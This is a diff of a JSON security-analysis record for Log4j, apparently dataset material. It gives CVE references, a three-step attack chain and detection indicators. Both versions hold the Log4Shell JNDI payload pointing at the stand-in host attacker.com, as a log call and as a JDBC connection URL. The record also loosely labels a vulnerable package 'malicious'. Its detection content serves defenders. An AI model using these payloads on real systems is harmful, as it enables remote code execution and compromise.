@@ -1,56 +1,56 @@
 {
   "package_info": {
     "package_name": "log4j",
-    "package_manager": "Maven Central Repository",
-    "package_versions": "Multiple versions affected (see CVEs: CVE-2021-44832, CVE-2022-23302, CVE-2022-23305, CVE-2021-44228)",
-    "why_malicious": "The Log4j package contains multiple critical and high-severity vulnerabilities that allow attackers to execute arbitrary code, escalate privileges, or exfiltrate sensitive data. These vulnerabilities are easily exploitable in many configurations and have been widely weaponized, making the package a high-risk component in the software supply chain."
+    "package_manager": "Maven",
+    "package_versions": "various (see CVEs below)",
+    "why_malicious": "Multiple versions of Log4j contain critical vulnerabilities that allow attackers to execute arbitrary code, escalate privileges, or exfiltrate sensitive data. These vulnerabilities are easily exploitable and have been widely abused in the wild, making affected versions of the package dangerous to use in production environments."
   },
   "malicious_snippets": [
     {
       "snippet_id": "snippet_1",
       "execution_context": {
         "trigger": "runtime",
-        "file_location": "JDBC Appender configuration (log4j2.xml or log4j2.properties)",
+        "file_location": "core logging logic (JndiLookup class)",
         "required_permissions": [
           "network",
-          "filesystem"
+          "environment_vars"
         ]
       },
-      "code_snippet": "<JDBC name=\"databaseAppender\" tableName=\"logs\" connectionSource=\"...\" />",
-      "code_language": "xml",
-      "code_behavior": "Allows attacker-controlled configuration to inject a malicious JDBC Appender, which can be exploited to execute arbitrary code if the attacker also controls the database or LDAP server referenced.",
+      "code_snippet": "logger.error(\"${jndi:ldap://attacker.com/a}\");",
+      "code_language": "java",
+      "code_behavior": "At runtime, the code processes a log message containing a JNDI lookup pattern, which triggers a remote LDAP request to attacker.com, resulting in remote code execution if the attacker controls the LDAP server.",
       "malice_analysis": {
-        "why_suspicious": "The ability to specify external resources (such as a database or LDAP server) in logging configuration files can be abused to load and execute attacker-controlled code.",
-        "violated_expectations": "Normal logging configuration should not allow remote code execution or loading of untrusted code via configuration files.",
-        "similar_legitimate_use": "Legitimate use involves connecting to trusted, internal databases for logging purposes.",
+        "why_suspicious": "The code allows untrusted user input to trigger network requests and load remote code via JNDI, which is highly dangerous.",
+        "violated_expectations": "Normal logging frameworks should not allow log message content to trigger network requests or code execution.",
+        "similar_legitimate_use": "JNDI lookups are sometimes used for legitimate resource discovery in trusted environments, but not with untrusted input.",
         "key_indicators": [
-          "External resource references in logging configuration",
-          "Ability to specify attacker-controlled endpoints",
-          "Potential for code execution via configuration"
+          "JNDI lookup in log message",
+          "Network request to attacker-controlled domain",
+          "Potential for remote code execution"
         ]
       }
     },
     {
       "snippet_id": "snippet_2",
       "execution_context": {
-        "trigger": "runtime",
-        "file_location": "Log message processing (core log4j classes)",
+        "trigger": "runtime (non-standard configuration)",
+        "file_location": "JDBC Appender configuration (CVE-2021-44832)",
         "required_permissions": [
-          "network",
-          "environment_vars"
+          "filesystem",
+          "network"
         ]
       },
-      "code_snippet": "${jndi:ldap://attacker.com/a}",
-      "code_language": "java (expression in log message)",
-      "code_behavior": "Triggers a JNDI lookup to an attacker-controlled LDAP server, which can return a malicious payload leading to remote code execution.",
+      "code_snippet": "<JDBCConnectionSource url=\"${jndi:ldap://attacker.com/a}\" />",
+      "code_language": "xml",
+      "code_behavior": "At runtime, if the JDBC Appender is configured with a JNDI URL, the code performs a JNDI lookup to an attacker-controlled LDAP server, which can result in remote code execution.",
       "malice_analysis": {
-        "why_suspicious": "Log message interpolation should not result in network requests or code execution. The use of JNDI lookups in log messages is highly abnormal and dangerous.",
-        "violated_expectations": "Normal log message processing should not evaluate expressions that result in network activity or code execution.",
-        "similar_legitimate_use": "JNDI lookups are legitimate in application configuration, but not in log message interpolation.",
+        "why_suspicious": "Allows attacker to control the JDBC connection source via JNDI, leading to arbitrary code execution.",
+        "violated_expectations": "JDBC configuration should not allow untrusted input to trigger remote lookups or code execution.",
+        "similar_legitimate_use": "JNDI-based configuration is sometimes used for dynamic resource resolution in trusted environments.",
         "key_indicators": [
-          "JNDI lookup patterns in log messages",
-          "Network requests triggered by log processing",
-          "Potential for remote code execution"
+          "JNDI in JDBC Appender configuration",
+          "Remote lookup in configuration file",
+          "Potential for code execution via configuration"
         ]
       }
     }
@@ -58,46 +58,47 @@
   "attack_chain": [
     {
       "step": 1,
-      "action": "Attacker injects a specially crafted log message or configuration referencing an external resource (e.g., LDAP or database server).",
+      "action": "Attacker sends a crafted log message or configuration containing a JNDI lookup string.",
       "implemented_by": [
         "snippet_1",
         "snippet_2"
       ],
-      "leads_to": "Log4j processes the message or configuration, triggering a network request to the attacker's server."
+      "leads_to": "JNDI lookup is triggered by the vulnerable Log4j code."
     },
     {
       "step": 2,
-      "action": "Log4j performs a JNDI lookup or loads a JDBC Appender from the attacker-controlled server.",
+      "action": "The vulnerable Log4j instance performs a network request to the attacker-controlled LDAP server.",
       "implemented_by": [
         "snippet_1",
         "snippet_2"
       ],
-      "leads_to": "Attacker's server responds with a malicious payload."
+      "leads_to": "Attacker can supply a malicious payload via LDAP."
     },
     {
       "step": 3,
-      "action": "Malicious payload is executed in the context of the vulnerable application, leading to remote code execution or data exfiltration.",
+      "action": "Log4j loads and executes code from the attacker’s server, resulting in remote code execution.",
       "implemented_by": [
         "snippet_1",
         "snippet_2"
       ],
-      "leads_to": "Full compromise of the application or underlying system."
+      "leads_to": "Attacker gains control over the affected system."
     }
   ],
   "detection_knowledge": {
     "behavioral_signatures": [
-      "Unexpected network requests during log message processing",
-      "JNDI lookup patterns in log messages or configuration",
-      "Loading of JDBC Appenders from untrusted sources"
+      "Log message or configuration containing ${jndi:ldap://...}",
+      "Unexpected outbound LDAP or RMI network requests from application servers",
+      "Dynamic code loading triggered by log message content"
     ],
     "file_indicators": [
-      "log4j2.xml or log4j2.properties files with external resource references",
-      "Presence of ${jndi:...} patterns in log messages or configuration"
+      "Presence of JndiLookup.class in log4j-core JAR",
+      "JDBC Appender configuration with JNDI URLs",
+      "Log files containing suspicious ${jndi:...} patterns"
     ],
     "network_indicators": [
-      "Outbound LDAP, RMI, or other JNDI-related network traffic to untrusted domains",
-      "Connections to attacker-controlled servers during logging operations"
+      "Outbound LDAP/RMI requests to untrusted or external domains",
+      "Connections to attacker-controlled infrastructure following log events"
     ],
-    "how_to_detect": "Monitor application logs and configuration files for JNDI lookup patterns or external resource references. Inspect network traffic for unexpected outbound connections during log processing. Use static analysis to detect vulnerable log4j versions and configurations that allow remote lookups or untrusted JDBC Appenders."
+    "how_to_detect": "Monitor application logs and configuration files for JNDI patterns, especially those referencing external LDAP/RMI servers. Inspect network traffic for unexpected outbound LDAP or RMI connections. Use file integrity monitoring to detect the presence of JndiLookup.class and scan for vulnerable Log4j versions. Employ runtime application security monitoring to detect dynamic code loading or execution triggered by log message content."
   }
 }
